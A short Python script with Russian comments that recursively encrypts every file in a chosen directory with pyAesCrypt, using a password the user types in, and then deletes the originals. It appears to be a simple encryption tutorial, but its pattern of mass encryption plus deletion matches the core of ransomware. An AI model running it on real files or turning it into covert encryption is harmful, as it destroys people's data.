import os
import pyAesCrypt  # type: ignore


# Функция шифрования.
def encryption(file, password):
    # Задаем размер буфера.
    buffer_size = 512 * 1024

    # Вызываем метод шифрования.
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + '.cpr',
        password,
        buffer_size
    )

    # Сообщение о шифровании.
    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")

    # Удаляем исходный файл.
    os.remove(file)


# Функция сканирования директории
def walking_by_dirs(dir, password):
    # Перебор всех поддиректорий в указанной директории.
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # Если находим, то шифруем
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # Если находим директорию, то повторяем цикл поиска файлов
        else:
            walking_by_dirs(path, password)


password = input('Введите пароль для шифрования: ')
walking_by_dirs('путь до директории', password)
